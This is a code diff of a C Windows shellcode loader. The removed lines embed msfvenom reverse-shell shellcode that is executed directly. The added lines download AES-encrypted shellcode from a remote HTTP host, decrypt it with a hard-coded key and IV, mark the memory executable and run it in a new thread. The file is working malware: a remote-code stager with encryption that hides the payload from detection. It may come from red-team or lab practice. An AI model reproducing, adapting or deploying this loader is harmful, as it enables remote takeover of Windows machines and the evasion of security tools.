@@ -1,86 +1,234 @@
 #include <Windows.h>
 #include <stdio.h>
+#include <string.h>
+#include <wininet.h>
+#include "aes.h"
+
+// import wininet.lib
+#pragma comment (lib, "Wininet.lib")
+#define PAYLOAD L"http://192.168.13.1:8000/encrypted_shellcode.bin"
 
 // basic shellcode loader that have the shellcode embedded within the file
 
 // set to 1 for error logs
-#define DEBUG 0
 
-// msfvenom -p windows/x64/shell_reverse_tcp -f c LHOST=192.168.13.1 LPORT=31337
+// #define DEBUG
 
-unsigned char shellcode[] =
-    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
-    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
-    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
-    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
-    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
-    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
-    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
-    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
-    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
-    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
-    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
-    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
-    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
-    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
-    "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
-    "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
-    "\x00\x49\x89\xe5\x49\xbc\x02\x00\x7a\x69\xc0\xa8\x0d\x01"
-    "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
-    "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
-    "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
-    "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
-    "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
-    "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
-    "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
-    "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
-    "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
-    "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
-    "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
-    "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
-    "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
-    "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
-    "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
-    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
 
-int main() {
-    size_t shellcode_size = sizeof(shellcode);
+// payload inside of encrypted_shellcode
+// unsigned char encrypted_payload[] = {
+//	0xA9, 0x78, 0xC4, 0xBB, 0x6F, 0x5A, 0x8C, 0x54, 0xCE, 0x6D, 0x63, 0x47, 0xFE, 0xBB, 0x3D, 0x04,
+//	0x19, 0xE1, 0x99, 0x55, 0x45, 0xF5, 0xE1, 0x96, 0xAD, 0x4C, 0xB8, 0x56, 0x87, 0x36, 0x09, 0xC7,
+//	0xD7, 0x3C, 0x3B, 0x52, 0xCC, 0xAD, 0x3C, 0x0F, 0x8D, 0xAA, 0xB8, 0xFB, 0xDA, 0x5D, 0xA3, 0xE9,
+//	0xB0, 0x01, 0x99, 0x81, 0xEF, 0x95, 0x86, 0xD9, 0x76, 0xB4, 0xA0, 0x08, 0x2E, 0x47, 0xC0, 0xD6,
+//	0xE9, 0x8A, 0x9F, 0x29, 0x07, 0x35, 0x71, 0xBC, 0xA0, 0x5F, 0x9B, 0x69, 0x52, 0x43, 0x40, 0x4D,
+//	0x35, 0x5B, 0x41, 0x08, 0x11, 0x47, 0x6D, 0xC7, 0x01, 0xB3, 0xF1, 0xB3, 0xB7, 0x88, 0x0D, 0xC6,
+//	0x65, 0x84, 0x0C, 0x1F, 0xD6, 0x93, 0x4C, 0xB4, 0x59, 0x67, 0x8E, 0xBC, 0x67, 0x73, 0xD9, 0xE7,
+//	0xBA, 0xD0, 0x55, 0xB2, 0xD4, 0x5D, 0xE0, 0x51, 0x70, 0xBF, 0x7F, 0x8A, 0x42, 0xE0, 0x9A, 0x69,
+//	0xC4, 0xF8, 0x98, 0x6A, 0x36, 0xA5, 0x78, 0xDE, 0xD8, 0xD7, 0xCA, 0x63, 0x84, 0xBF, 0xC0, 0x0B,
+//	0x6C, 0x5B, 0x44, 0x1B, 0x13, 0x7D, 0x91, 0x19, 0xE4, 0x9B, 0x05, 0xA1, 0xBE, 0xA9, 0xEF, 0x77,
+//	0xF9, 0xE4, 0x20, 0x47, 0x18, 0xFD, 0xD4, 0x64, 0x1C, 0x30, 0xAD, 0xFE, 0xE8, 0x85, 0xD1, 0x39,
+//	0x6C, 0xBA, 0x54, 0x2E, 0x98, 0x9D, 0x9C, 0xB9, 0xDB, 0x67, 0x49, 0xBD, 0x1E, 0x0F, 0x87, 0x7E,
+//	0x66, 0x18, 0x8D, 0x39, 0xBA, 0x65, 0xE2, 0x46, 0x49, 0x73, 0x73, 0xA5, 0xBA, 0x59, 0x1C, 0x99,
+//  0xA9, 0x6D, 0x8F, 0x68, 0x80, 0x23, 0x5C, 0x65, 0x92, 0x61, 0xFE, 0x1A, 0xE1, 0xE3, 0xB8, 0x7D,
+//  0x53, 0xA0, 0xD2, 0x9B, 0xD7, 0x4F, 0xF3, 0xF1, 0x6F, 0xDB, 0x4B, 0x98, 0x57, 0x6C, 0x68, 0x45,
+//  0x65, 0xCA, 0x7A, 0xF4, 0xD3, 0xCC, 0x76, 0x24, 0xFA, 0x60, 0xE0, 0x3D, 0xD7, 0xBD, 0x10, 0x02,
+//  0xDC, 0x6D, 0x6D, 0xDB, 0x3D, 0x0F, 0x62, 0xF3, 0x51, 0xD1, 0x71, 0x32, 0x40, 0x01, 0xD7, 0x3C,
+//  0x06, 0x1D, 0x58, 0x7B, 0x5B, 0xC3, 0xE4, 0xC0, 0xBF, 0x19, 0xC5, 0xF5, 0xA7, 0xC2, 0x47, 0xED,
+//  0x89, 0xA7, 0x55, 0x5C, 0xCC, 0xE7, 0xDA, 0xAC, 0xA0, 0x58, 0x51, 0xB6, 0x07, 0xF8, 0xBB, 0x2F,
+//  0x4A, 0x2E, 0x80, 0x11, 0xFE, 0x61, 0x03, 0x4C, 0x3D, 0xAD, 0x73, 0xA2, 0x6A, 0x8B, 0xC9, 0x36,
+//  0xF1, 0x18, 0xB4, 0x1C, 0xB0, 0xBA, 0x16, 0x3F, 0x93, 0x0A, 0xD8, 0x64, 0xC2, 0x27, 0x99, 0xC0,
+//  0x8D, 0xDC, 0x4E, 0xD9, 0x39, 0xAD, 0x26, 0xF4, 0x67, 0x96, 0x87, 0x48, 0xB9, 0xFA, 0xEE, 0x86,
+//  0xC5, 0xB9, 0x96, 0xF6, 0xF2, 0x60, 0x31, 0xDF, 0x4B, 0x35, 0x9D, 0x68, 0xD3, 0x3E, 0x79, 0x4D,
+//  0xFB, 0x5F, 0x42, 0xE2, 0x2D, 0x6E, 0xC6, 0xB6, 0xE3, 0xB0, 0x6A, 0x7D, 0xE9, 0x29, 0xDA, 0xD4,
+//  0x1C, 0x6F, 0x8D, 0x1D, 0x10, 0x51, 0x01, 0xBC, 0x35, 0x06, 0x5A, 0x89, 0xA8, 0xEC, 0xB6, 0xB9,
+//  0xB8, 0x8A, 0x43, 0xA8, 0x68, 0xDF, 0x1F, 0x7C, 0x59, 0xA0, 0x4C, 0x57, 0x42, 0xB8, 0x92, 0x82,
+//  0xA6, 0x00, 0x7A, 0xF6, 0x99, 0x80, 0xFF, 0x7E, 0x03, 0x8C, 0x87, 0x50, 0x9B, 0x73, 0x79, 0x32,
+//  0x60, 0x7D, 0xA9, 0xBD, 0xBA, 0xDE, 0x5F, 0x54, 0xF3, 0x1B, 0x7C, 0xE2, 0x47, 0x7E, 0x58, 0xDC,
+//  0xF2, 0x5C, 0xAE, 0x9E, 0x1C, 0x00, 0x64, 0xFA, 0x02, 0x76, 0x7E, 0x3D, 0x8D, 0x10, 0xD4, 0x35 };
 
-    PVOID pShellCodeAddress = VirtualAlloc(0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    if (pShellCodeAddress == NULL) {
-    #if DEBUG
-        printf("[+] VirtualAlloc failed with error: %d \n", GetLastError());
-    #endif
+BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {
+
+
+    PBYTE pTmpBytes = NULL;
+
+    PBYTE pBytes = NULL;
+
+    SSIZE_T sSize = 0;
+
+    DWORD dwBytesRead = 0;
+
+    HINTERNET hInternet = NULL;
+
+    HINTERNET hInternetFile = NULL;
+
+    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
+
+    hInternetFile = InternetOpenUrlW(hInternet, srcurl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
+
+    if (hInternetFile == NULL) {
+        #ifdef DEBUG
+        printf("[!] InternetOpenUrlW failed with code: %d \n", GetLastError());
+        #endif
+        return FALSE;
+    }
+
+    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
+
+    while (TRUE)
+    {
+        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
+            #ifdef DEBUG
+            printf("[!] InternetReadFile failed with error: %d \s", GetLastError());
+            #endif
+            return FALSE;
+        }
+
+        sSize += dwBytesRead;
+
+        if (pBytes == NULL) {
+            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
+        } else {
+            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+        }
+
+        if (pBytes == NULL) {
+            return FALSE;
+        }
+
+        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+
+        memset(pTmpBytes, '\0', dwBytesRead);
+
+        if (dwBytesRead < 1024) {
+            break;
+        }
+
+    }
+
+        InternetCloseHandle(hInternet);
+        InternetCloseHandle(hInternetFile);
+        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+
+        *sPayloadBytes = pBytes;
+        *sPayloadSize = sSize;
+
+        LocalFree(pTmpBytes);
+        #ifdef DEBUG
+        printf("[+] Size of payload: %d \n", sSize);
+        #endif
+        return TRUE;
+
+}
+
+
+
+
+
+unsigned char AesKey[] = {
+	0x38, 0x97, 0x97, 0x2D, 0xD8, 0x02, 0xAD, 0x25, 0x89, 0x66, 0x5E, 0xBA, 0x0F, 0x44, 0xB8, 0x17,
+	0xFB, 0xB7, 0xF5, 0xDA, 0x80, 0xFC, 0xF2, 0xBE, 0x81, 0x31, 0xE3, 0x77, 0xEE, 0x5D, 0x46, 0xDE };
+
+
+unsigned char AesIv[] = {
+	0xB5, 0x27, 0x51, 0x48, 0x31, 0x75, 0x5B, 0x88, 0x9A, 0x09, 0x7A, 0xD8, 0xDC, 0xE7, 0x31, 0x03 };
+
+
+
+// for debugging only
+
+VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {
+
+	printf("unsigned char %s[] = {", Name);
+
+	for (int i = 0; i < Size; i++) {
+		if (i % 16 == 0) {
+			printf("\n\t");
+		}
+		if (i < Size - 1) {
+			printf("0x%0.2X, ", Data[i]);
+		}
+		else {
+			printf("0x%0.2X ", Data[i]);
+		}
+	}
+
+	printf("};\n\n\n");
+
+}
+BOOL DecryptAES(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv) {
+
+	struct	AES_ctx AesCtx = { 0x00 };
+
+	if (!pCipherTextBuffer || !sCipherTextSize || !pAesKey || !pAesIv)
+		return FALSE;
+
+	RtlSecureZeroMemory(&AesCtx, sizeof(AesCtx));
+	AES_init_ctx_iv(&AesCtx, pAesKey, pAesIv);
+	AES_CBC_decrypt_buffer(&AesCtx, pCipherTextBuffer, sCipherTextSize);
+
+	return TRUE;
+}
+
+
+int main(int argc, char* argv[]) {
+    PBYTE pEncrypted = NULL;
+    size_t sSizeOfPayload = 0;
+    DWORD flOldProtect = 0;
+
+    // 1: Get encrypted payload
+
+    if (!GetPayload(PAYLOAD, &pEncrypted, &sSizeOfPayload)) {
+        #ifdef DEBUG
+        printf("[!] Failed to get the payload\n ");
+        #endif
         return -1;
     }
 
-    memcpy(pShellCodeAddress, shellcode, shellcode_size);
+    // 2: Decrypt Payload
 
-    memset(&shellcode, '\0', shellcode_size); // zeroing out the prev shellcode buffer
 
-    DWORD dwOldProtection = 0;
-
-    if (!VirtualProtect(pShellCodeAddress, shellcode_size, PAGE_EXECUTE_READWRITE, &dwOldProtection)) { // set the shellcode memory region to read/write/execute
-    #if DEBUG
-        printf("[+] VirtualProtect failed with error: %d \n ", GetLastError());
-    #endif
+    if (!DecryptAES(pEncrypted, sSizeOfPayload, AesKey, AesIv)) {
+        #ifdef DEBUG
+        printf("[!] Failed to decrypt the buffer \n ");
+        #endif
         return -1;
     }
 
-    #if DEBUG
-    printf("[+] Press Enter to continue ... ");
-    getchar();
+    #ifdef DEBUG
+    PrintHexData("pEncrypted", pEncrypted, sSizeOfPayload);
     #endif
-    if(!CreateThread(0, 0, pShellCodeAddress, 0, 0, 0)) { // execute the shellcode
-    #if DEBUG
-        printf("[+] CreateThread failed with error: %d \n", GetLastError());
-    #endif
+
+    PVOID pDecrypted = VirtualAlloc(NULL, sSizeOfPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (pDecrypted == NULL) {
+        #ifdef DEBUG
+        printf("[!] VirtualAlloc failed with error: %d \n ", GetLastError());
+        #endif
         return -1;
     }
 
-    // free the heap
-    HeapFree(GetProcessHeap(), 0, pShellCodeAddress);
 
+    // 3: Copy payload to new location
+    memcpy(pDecrypted, pEncrypted, sSizeOfPayload); // copy the payload to the memory region we control
+    memset(pEncrypted, '\0', sSizeOfPayload); // empty the original payload location
+
+    if (!VirtualProtect(pDecrypted, sSizeOfPayload, PAGE_EXECUTE_READWRITE, &flOldProtect)) {
+        #ifdef DEBUG
+        printf("[!] VirtualProtect failed with error: %d \n ", GetLastError());
+        #endif
+        return -1;
+    }
+
+    // 4: Execute the payload
+    if (!CreateThread(NULL, NULL, pDecrypted, NULL, NULL, NULL)) {
+        #ifdef DEBUG
+        printf("[!] CreateThread failed with error: %d \n ", GetLastError());
+        #endif
+        return -1;
+    }
+
+    HeapFree(GetProcessHeap(), 0, pDecrypted);
     return 0;
 }
